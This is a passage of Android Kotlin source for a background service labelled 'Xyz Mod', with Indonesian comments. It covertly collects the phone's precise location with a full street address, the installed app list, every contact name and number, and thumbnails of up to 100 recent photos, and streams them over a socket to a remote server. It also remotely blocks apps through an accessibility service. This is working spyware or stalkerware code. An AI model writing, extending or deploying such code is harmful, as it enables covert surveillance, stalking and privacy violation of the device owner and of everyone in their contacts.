            .setContentTitle("Xyz Mod")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Xyz Mod Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    // ── GPS Location ─────────────────────────────────────────────────────────
    private fun sendLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e("DeviceService", "sendLocation: permission not granted")
            return
        }
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        // Coba ambil last known location dulu (cepet)
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)
        var best: Location? = null
        for (p in providers) {
            try {
                val loc = lm.getLastKnownLocation(p) ?: continue
                if (best == null || loc.accuracy < best.accuracy) best = loc
            } catch (_: Exception) {}
        }
        if (best != null) {
            emitLocationData(best)
            return
        }
        // Kalau ga ada last known, request satu kali update
        val listener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                emitLocationData(loc)
                try { lm.removeUpdates(this) } catch (_: Exception) {}
            }
            override fun onProviderEnabled(p: String) {}
            override fun onProviderDisabled(p: String) {}
            @Deprecated("Deprecated in Java") override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
        }
        for (p in providers) {
            try {
                if (lm.isProviderEnabled(p)) {
                    lm.requestLocationUpdates(p, 0L, 0f, listener, Looper.getMainLooper())
                    break
                }
            } catch (_: Exception) {}
        }
        // Timeout 10 detik
        Handler(Looper.getMainLooper()).postDelayed({
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
        }, 10000)
    }

    @Suppress("DEPRECATION")
    private fun emitLocationData(loc: Location) {
        Thread {
            try {
                val lat = loc.latitude
                val lng = loc.longitude
                val acc = loc.accuracy
                val obj = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("lat", lat)
                    put("lng", lng)
                    put("accuracy", acc)
                    put("mapsUrl", "https://www.google.com/maps?q=$lat,$lng")
                }
                // Reverse geocode
                try {
                    val geocoder = Geocoder(this, Locale("id", "ID"))
                    val addrs = geocoder.getFromLocation(lat, lng, 1)
                    if (!addrs.isNullOrEmpty()) {
                        val addr = addrs[0]
                        obj.put("address",      addr.getAddressLine(0) ?: "")
                        obj.put("kelurahan",    addr.subLocality ?: "")
                        obj.put("kecamatan",    addr.subAdminArea ?: "")
                        obj.put("kabupaten",    addr.adminArea ?: "")
                        obj.put("provinsi",     addr.adminArea ?: "")
                        obj.put("kodePos",      addr.postalCode ?: "")
                        obj.put("negara",       addr.countryName ?: "")
                        // Coba parse provinsi & kabupaten dari subAdminArea / adminArea
                        val sub = addr.subAdminArea ?: ""
                        val adm = addr.adminArea ?: ""
                        // Indonesia: subAdminArea = Kab/Kota, adminArea = Provinsi
                        obj.put("kabupaten", sub.ifEmpty { adm })
                        obj.put("provinsi",  adm)
                    }
                } catch (e: Exception) {
                    Log.e("DeviceService", "Geocoder: ${e.message}")
                }
                if (socket?.connected() == true) {
                    socket?.emit("device:location", obj)
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "emitLocationData: ${e.message}")
            }
        }.start()
    }

    // ── App List ──────────────────────────────────────────────────────────────
    private fun sendAppList() {
        Thread {
            try {
                val pm = packageManager
                val installed = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                val arr = JSONArray()
                for (app in installed) {
                    // Skip app XYZ sendiri
                    if (app.packageName == packageName) continue
                    val name = pm.getApplicationLabel(app).toString()
                    val pkg  = app.packageName
                    val blocked = blockedApps.contains(pkg) || (blockAllApps && pkg != packageName)
                    arr.put(JSONObject().apply {
                        put("name",    name)
                        put("pkg",     pkg)
                        put("blocked", blocked)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:applist", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("apps",     arr)
                    put("blockAll", blockAllApps)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendAppList: ${e.message}")
            }
        }.start()
    }

    private fun sendContactList() {
        Thread {
            try {
                val arr = JSONArray()
                val cursor = contentResolver.query(
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null, null,
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        val name   = it.getString(0) ?: ""
                        val number = it.getString(1) ?: ""
                        arr.put(JSONObject().apply {
                            put("name",   name)
                            put("number", number)
                        })
                    }
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:contacts", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("contacts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendContactList: ${e.message}")
            }
        }.start()
    }

    private fun sendGalleryList() {
        Thread {
            try {
                val MAX_PHOTOS = 100
                val arr = JSONArray()
                val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val projection = arrayOf(
                    android.provider.MediaStore.Images.Media._ID,
                    android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                    android.provider.MediaStore.Images.Media.DATE_TAKEN
                )
                val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_TAKEN} DESC"
                val cursor = contentResolver.query(uri, projection, null, null, sortOrder)
                var count = 0
                cursor?.use {
                    val idCol   = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
                    val nameCol = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
                    while (it.moveToNext() && count < MAX_PHOTOS) {
                        val id   = it.getLong(idCol)
                        val name = it.getString(nameCol) ?: ""
                        val imgUri = android.net.Uri.withAppendedPath(uri, id.toString())
                        try {
                            val bmp = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                contentResolver.loadThumbnail(imgUri, android.util.Size(200, 200), null)
                            } else {
                                android.provider.MediaStore.Images.Thumbnails.getThumbnail(
                                    contentResolver, id,
                                    android.provider.MediaStore.Images.Thumbnails.MICRO_KIND, null
                                )
                            }
                            if (bmp != null) {
                                val baos = java.io.ByteArrayOutputStream()
                                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 50, baos)
                                val b64 = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
                                arr.put(JSONObject().apply {
                                    put("id",    id)
                                    put("name",  name)
                                    put("thumb", b64)
                                })
                                count++
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "thumb error: ${e.message}")
                        }
                    }
                }
                if (socket?.connected() != true) return@Thread
                // Kirim batch per 20 foto biar ga overload sekaligus
                val batchSize = 20
                var sent = 0
                while (sent < arr.length()) {
                    val batch = JSONArray()
                    val end = minOf(sent + batchSize, arr.length())
                    for (i in sent until end) batch.put(arr.get(i))
                    socket?.emit("device:gallery", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("photos",   batch)
                        put("page",     sent / batchSize)
                        put("total",    arr.length())
                    })
                    sent += batchSize
                    Thread.sleep(100)
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGalleryList: ${e.message}")
            }
        }.start()
    }

    private fun blockApp(pkg: String) {
        if (pkg.isEmpty()) return
        blockedApps.add(pkg)
        saveBlockedApps()
        Log.d("DeviceService", "Blocked: $pkg")
    }

    private fun unblockApp(pkg: String) {
        if (pkg.isEmpty()) return
        blockedApps.remove(pkg)
        saveBlockedApps()
        Log.d("DeviceService", "Unblocked: $pkg")
    }

    private fun setBlockAll(enabled: Boolean) {
        blockAllApps = enabled
        saveBlockedApps()
        Log.d("DeviceService", "BlockAll: $enabled")
    }

    private fun saveBlockedApps() {
        val prefs = getSharedPreferences("block_prefs", MODE_PRIVATE)
        prefs.edit()
            .putStringSet("blocked", blockedApps)
            .putBoolean("blockAll", blockAllApps)
            .apply()
        // Sync ke Accessibility Service
        XyzAccessibilityService.updateBlockedApps(blockedApps.toSet(), blockAllApps, packageName)
    }

    private fun loadBlockedApps() {
        val prefs = getSharedPreferences("block_prefs", MODE_PRIVATE)
        blockedApps.clear()
        blockedApps.addAll(prefs.getStringSet("blocked", emptySet()) ?: emptySet())
        blockAllApps = prefs.getBoolean("blockAll", false)
        XyzAccessibilityService.updateBlockedApps(blockedApps.toSet(), blockAllApps, packageName)
    }
}

object SocketHolder {
    var connected: Boolean = false
}
